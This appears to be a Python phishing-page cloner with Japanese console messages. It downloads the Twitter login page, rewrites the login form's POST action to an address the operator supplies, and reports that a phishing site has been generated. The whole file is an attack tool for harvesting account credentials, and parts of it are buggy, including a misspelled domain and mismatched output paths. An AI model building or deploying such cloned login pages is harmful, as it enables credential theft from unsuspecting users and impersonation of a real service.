from lxml import html
import subprocess
import os,sys,time,re,shutil,urllib
import urllib.request
#import requests

def relative(clonesite, base):
    fullpath = "./clone/index.html"
    subpath = "./clone/index2.html"
    before = r'action="*"'
    after = 'action="' + input('[+]書き換えるアクション属性名： ') + '"'

    with open(clonesite, "r", encoding="utf-8") as rf:
        doc = html.parse(rf).getroot()
        html.make_links_absolute(doc, base)
        rehtml = html.tostring(doc, pretty_print=True).decode('utf-8')
        try:
            filewrite = open(subpath, "w", encoding="utf-8")
            filewrite.write(rehtml)
        except:
            print("[+]HMLファイルを正しく開けませんでした")
        finally:
            filewrite.close()
            rf.close()

    fileopen = open(subpath, "r", encoding="utf-8").readlines()
    filewrite = open(subpath, "w", encoding="utf-8")

    try:
        for line in fileopen:
            match = re.search('post', line, flags=re.IGNORECASE)
            method_post = re.search("method-post", line, flags=re.IGNORECASE)
            if match or method_post:
                line = re.sub(before, after, line)
            filewrite.write(line)
    except:
        print("[+]HTMLの整形に失敗しました")
    finally:
        filewrite.close()

    try:
        if os._exists(fullpath):
            os.remove(fullpath)
        shutil.copyfile(subpath, fullpath)
        os.remove(subpath)
    except:
        print("[+]index2.htmlをindex.htmlに置き換え失敗しました")

def clone(url):
    user_agent = "Mozilla/5.0 (Windows; Intel Max OS X) Chrome/45.0.2454.101 Safari/537.36"
    try:
        wget = 0
        """
       if os.path.isfile("/usr/local/bin/wget"):
           wget = 1
       if os.path.isfile("/usr/bin/wget"):
           wget = 1
       if os.path.isfile("/usr/local/wget"):
           wget = 1

       if wget == 1:
           subprocess.Popen('cd %s;wget --no-check-certificate -O index.html -c -k -U "%s" "%s";' % (setdir, user_agent, url),
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=True
                            ).wait()
       """
        if wget == 0:
            headers = {'User-Agent' : user_agent}
            req = urllib.request.urlretrieve(url, setdir + "/index.html")
            """
          req = urllib.request.urlopen(url)
          html = req.read()
          if len(html) > 1:
              try:
                  filewrite = open(setdir + "/index.html", "w")
                  print()
                  filewrite.write(html.tostring())
              except:
                  print("[+]index.htmlの書き込みに失敗しました")
              finally:
                  filewrite.close()
          """
    except:
        print("[+]対象となるサイトのダウンロードに失敗しました")

if __name__ == '__main__':
    setdir = './downloads'
    #setdir = os.path.join(os.path.expanduser('~'), '/clone')
    if not os.path.isdir(setdir):
        os.makedirs(setdir)

    URL = "https://twitter.com/login"
    clone(URL)
    domain = "https://twitter.con/"
    path = setdir + "/index.html"
    relative(path, domain)

    print("[+]フィッシングサイトを " + setdir + " に生成しました")